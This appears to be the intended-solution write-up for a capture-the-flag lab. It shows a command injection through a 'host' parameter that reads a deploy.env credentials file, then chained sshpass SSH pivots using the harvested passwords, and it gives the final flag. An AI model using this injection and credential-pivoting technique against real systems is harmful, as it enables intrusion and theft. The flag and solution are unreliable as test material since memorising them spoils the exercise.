# Intended solution

The endpoint builds a shell command from the `host` parameter. Confirm the
foothold and enumerate its configuration:

```bash
curl --get --data-urlencode \
  'host=127.0.0.1; id; cat /srv/edge/config/deploy.env' \
  http://127.0.0.1:8090/check
```

The output gives the first hop’s host, username, and password. Execute SSH
from inside edge:

```bash
sshpass -p 'EdgeOps_Transit_7f3!' ssh \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  operator@ops 'cat /home/operator/archive-handoff.txt'
```

The second handoff gives the next host and credentials. Execute the second
hop from edge (which can reach ops, and ops is the bridge to vault):

```bash
sshpass -p 'EdgeOps_Transit_7f3!' ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null operator@ops \
  "sshpass -p 'ArchiveVault_9c2!' ssh -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null analyst@vault \
   'cat /home/analyst/final.flag'"
```

The result is `CTF{three_hosts_one_final_vault}`. The nested SSH command is
important: the final host is not reachable from the attacker’s host network.
